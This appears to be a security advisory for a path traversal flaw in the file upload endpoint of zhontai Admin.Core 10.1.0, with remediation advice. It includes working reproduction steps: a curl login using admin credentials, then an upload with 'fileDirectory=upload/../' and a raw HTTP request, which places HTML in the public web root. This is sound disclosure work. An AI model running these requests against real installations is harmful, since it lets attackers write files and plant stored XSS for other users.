# Admin.Core — Upload fileDirectory path traversal writes outside upload/ (AC-VULN-008)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Path Traversal |
| CWE | CWE-22 / CWE-434 |
| Authentication | Authenticated user with file upload permission |
| Severity | High |

## Summary

`UploadFileAsync` joins client-controlled `fileDirectory` under the static root without canonicalization. `fileDirectory=upload/../` writes HTML to wwwroot root and serves it anonymously as `/$guid.html` (also `upload/../../` escapes outside wwwroot).

## Root cause

Unsanitized fileDirectory + public UseStaticFiles for wwwroot.

## Exploit / reproduction

```bash
TOKEN=$(curl -s 'http://127.0.0.1:18010/api/admin/auth/login' -H 'Content-Type: application/json' \
  -d '{"userName":"admin","password":"123asd","accountType":1}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["accessToken"])')
curl -s 'http://127.0.0.1:18010/api/admin/file/upload-file' -H "Authorization: Bearer $TOKEN" \
  -F 'fileDirectory=upload/../' -F 'file=@trav.html;type=text/html'
# Open http://127.0.0.1:18010/<fileGuid>.html without auth
```


## PoC (Yakit)

```http
POST /api/admin/file/upload-file HTTP/1.1
Host: 127.0.0.1:18010
Authorization: Bearer ADMIN_TOKEN
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="fileDirectory"

upload/../
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="trav.html"
Content-Type: text/html

<html><body>trav</body></html>
------BOUNDARY--

# Then GET /{fileGuid}.html without auth
```

Expected: Upload success; anonymous GET /$guid.html returns HTML 200

## Screenshots

Dynamic verify writes `$guid.html` under Host/wwwroot; anonymous GET 200.

## Impact

Write arbitrary allowed file types outside upload folder; stored XSS / content overwrite.

## Remediation

Normalize and jail paths under upload/; reject '..'; serve via authenticated handler.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
